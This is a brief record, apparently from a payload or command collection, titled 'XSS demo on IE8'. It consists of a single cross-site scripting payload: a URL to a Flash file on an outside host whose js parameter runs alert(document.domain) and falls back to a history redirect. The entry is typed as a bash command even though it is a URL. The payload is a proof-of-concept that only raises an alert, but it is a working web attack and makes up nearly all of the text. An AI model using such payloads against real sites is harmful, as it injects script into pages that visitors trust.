---
id: 2c3e079e-9a95-47e1-b824-c53f3818ec0c
name: XSS demo on IE8
type: command
executor: bash
data: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){
  window.open(‘?js=history.go(-1)’,’_self’);}
output: null
created_at: '2023-04-06T03:56:42.101108+00:00'
updated_at: '2023-04-10T20:21:40.578602+00:00'
---

# XSS demo on IE8

```bash
http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
```
